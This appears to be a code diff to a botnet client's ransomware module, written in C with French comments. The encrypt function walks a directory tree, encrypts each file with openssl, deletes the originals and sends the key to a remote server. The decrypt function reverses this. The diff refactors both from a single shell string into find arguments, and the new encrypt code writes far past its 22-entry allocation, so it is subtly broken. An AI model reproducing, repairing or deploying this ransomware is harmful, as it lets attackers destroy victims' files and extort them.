@@ -264,51 +264,98 @@ char* generate_key(){
     return key;
 }
 
-void encrypt(int sockfd,const char *filepath){
+void encrypt(int sockfd, const char *filepath) {
     char *key = generate_key(); // key generation
     if (!key) {
         output_log("encrypt : Failed to generate encryption key\n", LOG_ERROR, LOG_TO_ALL);
-        free(key);
         return;
     }
-    char command[2048];
-    snprintf(
-        command, sizeof(command),
-        "%s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 -o -path /tmp/botnet \\) -prune -o -type f ! -name \"*.encrypted\" -exec sh -c 'openssl aes-256-cbc -a -salt -pbkdf2 -in \"$1\" -out \"$1.encrypted\" -k \"%s\" && rm -f \"$1\"' _ {} \\; > /dev/null 2>&1 &",
-        filepath, key
-    );
 
+    // Prépare chaque argument séparément
     Command cmd = {
         .cmd_id = "0",
         .delay = 0,
-        .program = strdup("/bin/sh"), // Dynamically allocate program
+        .program = strdup("find"),
         .expected_exit_code = 0,
-        .params = malloc(3 * sizeof(char *)), // Allocate space for params
+        .params = malloc(22 * sizeof(char *)), // Ajuste la taille si besoin
     };
-    cmd.params[0] = strdup("-c"); // First parameter is the shell option
-    cmd.params[1] = strdup(command); // Second parameter is the command to execute
-    cmd.params[2] = NULL; // Null-terminate the params array
+    int i = 0;
+    cmd.params[i++] = strdup(filepath);
+    cmd.params[i++] = strdup("(");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/proc");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/sys");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/dev");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/usr");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/usr/bin");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/bin");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/sbin");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/lib");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/lib64");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/tmp/botnet");
+    cmd.params[i++] = strdup(")");
+    cmd.params[i++] = strdup("-prune");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-type");
+    cmd.params[i++] = strdup("f");
+    cmd.params[i++] = strdup("!");
+    cmd.params[i++] = strdup("-name");
+    cmd.params[i++] = strdup("*.encrypted");
+    cmd.params[i++] = strdup("-exec");
+    cmd.params[i++] = strdup("sh");
+    cmd.params[i++] = strdup("-c");
 
-    output_log("encrypt : Encrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
-    
+    // Prépare la commande shell à exécuter pour chaque fichier
+    char *sh_cmd = malloc(512);
+    snprintf(
+        sh_cmd, 512,
+        "openssl aes-256-cbc -a -salt -pbkdf2 -in \"$1\" -out \"$1.encrypted\" -k \"%s\" && rm -f \"$1\"",
+        key
+    );
+    cmd.params[i++] = sh_cmd;
+    cmd.params[i++] = strdup("_");
+    cmd.params[i++] = strdup("{}");
+    cmd.params[i++] = strdup(";");
+    cmd.params[i] = NULL; // Null-terminate
+
+    output_log("encrypt : Encrypting files with find/openssl\n", LOG_DEBUG, LOG_TO_CONSOLE);
+
     write_encrypted_file("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log", key); // Write the key to a file
-    if(send_file(sockfd, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") == 0) { // send key to server
+    if (send_file(sockfd, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") == 0) {
         output_log("encrypt : Failed to send encryption key file to server\n", LOG_ERROR, LOG_TO_ALL);
         free(key);
         free_command(&cmd);
+        free(sh_cmd);
         return;
     }
     output_log("encrypt : Encryption key sent to server\n", LOG_DEBUG, LOG_TO_CONSOLE);
-    // Supprimer le fichier temporaire contenant la clé
-    if (remove("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") != 0) { // remove the key file
+    if (remove("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") != 0) {
         output_log("encrypt : Failed to delete key file: %s\n", LOG_ERROR, LOG_TO_ALL, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log");
     }
 
     parse_and_execute_command(cmd, sockfd); // Execute the command
     free_command(&cmd); // Free dynamically allocated fields
     free(key); // Free the generated key
+    free(sh_cmd);
     return;
-
 }
 
 void write_encrypted_file(const char *filepath, const char *key) {
@@ -327,30 +374,77 @@ void decrypt(int sockfd, const char *filepath, const char* key) {
     Command cmd = {
         .cmd_id = "0",
         .delay = 0,
-        .program = strdup("/bin/sh"), // Dynamically allocate program
+        .program = strdup("find"),
         .expected_exit_code = 0,
-        .params = malloc(3 * sizeof(char *)), // Allocate space for params
+        .params = malloc(40 * sizeof(char *)), // Ajuste la taille si besoin
     };
-    char command[2048];
+    int i = 0;
+    cmd.params[i++] = strdup(filepath);
+    cmd.params[i++] = strdup("(");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/proc");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/sys");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/dev");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/usr");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/usr/bin");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/bin");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/sbin");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/lib");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/lib64");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-path");
+    cmd.params[i++] = strdup("/tmp/botnet");
+    cmd.params[i++] = strdup(")");
+    cmd.params[i++] = strdup("-prune");
+    cmd.params[i++] = strdup("-o");
+    cmd.params[i++] = strdup("-type");
+    cmd.params[i++] = strdup("f");
+    cmd.params[i++] = strdup("-name");
+    cmd.params[i++] = strdup("*.encrypted");
+    cmd.params[i++] = strdup("-exec");
+    cmd.params[i++] = strdup("sh");
+    cmd.params[i++] = strdup("-c");
+
+    // Prépare la commande shell à exécuter pour chaque fichier
+    char *sh_cmd = malloc(512);
     snprintf(
-        command, sizeof(command),
-        " %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 -o -path /tmp/botnet \\) -prune -o -type f -name \"*.encrypted\" -exec sh -c 'original=\"${1%%.encrypted}\"; "
+        sh_cmd, 512,
+        "original=\"${1%%.encrypted}\"; "
         "if openssl aes-256-cbc -d -a -pbkdf2 -in \"$1\" -out \"$original\" -k \"%s\"; then "
         "echo \"Déchiffré avec succès: $1\"; "
         "rm -f \"$1\"; "
         "else "
         "echo \"Échec du déchiffrement: $1\" >&2; "
-        "fi' _ {} \\;",
-        filepath, key
+        "fi",
+        key
     );
-    cmd.params[0] = strdup("-c"); // First parameter is the shell option
-    cmd.params[1] = strdup(command); // Second parameter is the command to execute
-    cmd.params[2] = NULL; // Null-terminate the params array
-    
-    output_log("decrypt : Decrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
+    cmd.params[i++] = sh_cmd;
+    cmd.params[i++] = strdup("_");
+    cmd.params[i++] = strdup("{}");
+    cmd.params[i++] = strdup(";");
+    cmd.params[i] = NULL; // Null-terminate
+
+    output_log("decrypt : Decrypting files with find/openssl\n", LOG_DEBUG, LOG_TO_CONSOLE);
 
     parse_and_execute_command(cmd, sockfd); // Execute the command
     free_command(&cmd); // Free dynamically allocated fields
+    free(sh_cmd);
     return;
 }
 
